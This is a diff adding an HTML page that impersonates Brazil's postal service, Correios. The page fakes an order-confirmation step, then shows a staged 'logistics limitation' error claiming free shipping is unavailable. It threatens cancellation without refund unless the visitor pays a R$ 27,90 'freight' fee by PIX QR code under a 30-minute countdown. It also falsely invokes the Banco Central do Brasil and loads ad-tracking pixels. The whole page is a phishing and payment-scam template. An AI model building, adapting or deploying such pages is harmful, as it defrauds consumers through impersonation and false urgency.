@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Correios - Confirmar Pedido</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="./css/style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+  window.pixelId = "6a03bd245e88fb37d4bc2b73";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script></head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <img src="correios-logo-1-1.png" alt="Correios" style="height: 34px; width: auto;" />
+  </header>
+
+  <!-- Main -->
+  <div id="page1wrap"><main>
+    <div class="card">
+
+      <!-- Banner top -->
+      <div class="card-banner">
+        <div class="check-circle">
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
+            <polyline points="4 13 9 18 20 6" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <p class="banner-title">Confirme os dados de envio seu pedido:</p>
+      </div>
+
+      <!-- Body -->
+      <div class="card-body">
+
+        <div class="info-row">
+          <div class="info-dot gray"></div>
+          <p class="info-text shimmer">Carregando...</p>
+        </div>
+
+        <div class="info-row">
+          <div class="info-dot"></div>
+          <p class="info-text">O envio será em parceria com o <strong>Correios Transporte</strong></p>
+        </div>
+
+        <button class="btn-confirmar">
+          <span>CONFIRMAR</span>
+          <div class="btn-arrow">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="9 18 15 12 9 6"/>
+            </svg>
+          </div>
+        </button>
+
+        <div class="powered">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13" rx="2"/><path d="M16 8h4a1 1 0 0 1 1 1v9a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-3"/></svg>
+          Entrega garantida via Correios
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+  </main></div>
+
+  <!-- Loading overlay -->
+  <div class="overlay" id="overlay">
+    <div class="loading-card">
+      <div class="loading-icon">
+        <div class="spinner-ring"></div>
+      </div>
+      <p class="loading-title">Confirmando seus dados...</p>
+      <p class="loading-sub">Por favor aguarde</p>
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+      <span class="progress-label" id="progressLabel">0%</span>
+    </div>
+  </div>
+
+  <!-- Error screen (hidden initially) -->
+  <div id="errorScreen" style="display:none;">
+    <main>
+      <div class="card">
+        <div class="card-banner error-banner">
+          <div class="error-icon-wrap">
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
+              <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" fill="rgba(255,255,255,0.15)" stroke="#fff" stroke-width="1.8"/>
+              <line x1="12" y1="9" x2="12" y2="13" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+              <circle cx="12" cy="16.5" r="1" fill="#fff"/>
+            </svg>
+          </div>
+          <p class="banner-title">LIMITAÇÃO LOGÍSTICA NA ENTREGA
+</p>
+        </div>
+
+        <div class="card-body">
+          <p class="error-desc">Identificamos que, no momento, a opção de frete grátis está indisponível para sua região devido a limitações logísticas da transportadora responsável pela entrega.
+</p>
+
+          <div class="error-info-box">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#c1172c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0; margin-top:2px;">
+              <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><circle cx="12" cy="16" r="1" fill="#c1172c"/>
+            </svg>
+            <p>A regularização deste passo é obrigatória para garantir o envio da mercadoria. <span style="color:#888;">(Caso não seja realizada, o pedido poderá ser cancelado automaticamente, sem direito à reserva do produto ou reembolso.)</span></p>
+          </div>
+
+          <button class="btn-confirmar btn-frete">
+            <span>PAGAR FRETE</span>
+            <div class="btn-arrow">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="9 18 15 12 9 6"/>
+              </svg>
+            </div>
+          </button>
+
+          <div class="cta-badge">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            <span>Clique no botão para continuar</span>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <div class="gen-overlay" id="genOverlay" style="display:none;">
+    <div class="gen-card">
+      <div class="gen-icon"><div class="spinner-green"></div></div>
+      <p class="gen-title">Gerando seu PIX...</p>
+      <p class="gen-sub">Aguarde um momento</p>
+      <div class="gen-steps">
+        <div class="gen-step active" id="gs1"><div class="gen-step-dot"></div>Validando pedido</div>
+        <div class="gen-step" id="gs2"><div class="gen-step-dot"></div>Calculando frete</div>
+        <div class="gen-step" id="gs3"><div class="gen-step-dot"></div>Gerando chave PIX</div>
+        <div class="gen-step" id="gs4"><div class="gen-step-dot"></div>Criando QR Code</div>
+      </div>
+    </div>
+  </div>
+
+    <main id="pixPage" style="display:none;">
+    <div class="card pix-page">
+
+      <!-- Banner compacto -->
+      <div class="card-banner pix-banner">
+        <div class="banner-row">
+          <div class="pix-icon-wrap">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Pix_%28Brazil%29_logo.svg/1280px-Pix_%28Brazil%29_logo.svg.png" alt="PIX" style="width:26px;height:auto;display:block;filter:brightness(0) invert(1);" />
+          </div>
+          <div class="banner-text">
+            <p class="banner-title-sm">Pagamento via PIX</p>
+            <p class="banner-subtitle">Escaneie o QR Code ou copie o código</p>
+          </div>
+        </div>
+        <div class="timer-badge">
+          <div class="timer-left">
+            <div class="timer-dot"></div>
+            <span>Expira em</span>
+          </div>
+          <span class="timer-val" id="timerDisplay">29:59</span>
+        </div>
+      </div>
+
+      <!-- Body -->
+      <div class="card-body">
+
+        <!-- Valor -->
+        <div class="value-pill">
+          <span class="value-label">Valor do frete</span>
+          <span class="value-amount">R$ 27,90</span>
+        </div>
+
+        <!-- QR + copia e cola lado a lado -->
+        <div class="pix-main">
+          <div class="qr-side">
+           <div class="qr-box">
+  <div id="qrCanvas"></div>
+  <div class="qr-corner tl"></div>
+  <div class="qr-corner tr"></div>
+  <div class="qr-corner bl"></div>
+  <div class="qr-corner br"></div>
+</div>
+            <p class="qr-hint">Escaneie com<br>o app do banco</p>
+          </div>
+
+          <div class="code-side">
+            <span class="code-side-label">Copia e Cola</span>
+            <div class="pix-code-box" id="pixCode"></div>
+            <button class="btn-copiar" id="btnCopiar" onclick="copiarPix()">
+              <svg class="copy-icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+              </svg>
+              <svg class="check-icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"/>
+              </svg>
+              <span id="btnText">COPIAR</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Aviso expiração -->
+        <div class="expiry-box">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#92400e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;margin-top:1px;">
+            <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+          </svg>
+          <span>Código válido por <strong>30 minutos</strong>. Após expirar, será necessário gerar um novo.</span>
+        </div>
+
+        <!-- Como pagar -->
+        <p class="section-label">Como pagar</p>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-num">1</div>
+            <p class="step-text">Abra o <strong>app do seu banco</strong></p>
+          </div>
+          <div class="step-item">
+            <div class="step-num">2</div>
+            <p class="step-text">Escolha <strong>PIX Copia e Cola</strong> ou <strong>QR Code</strong></p>
+          </div>
+          <div class="step-item">
+            <div class="step-num">3</div>
+            <p class="step-text">Cole o código ou escaneie e confirme</p>
+          </div>
+        </div>
+
+        <div class="powered-green">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          Pagamento seguro via PIX • Banco Central do Brasil
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+
+
+
+  <script src="script.js"></script>
+</body>
+</html>
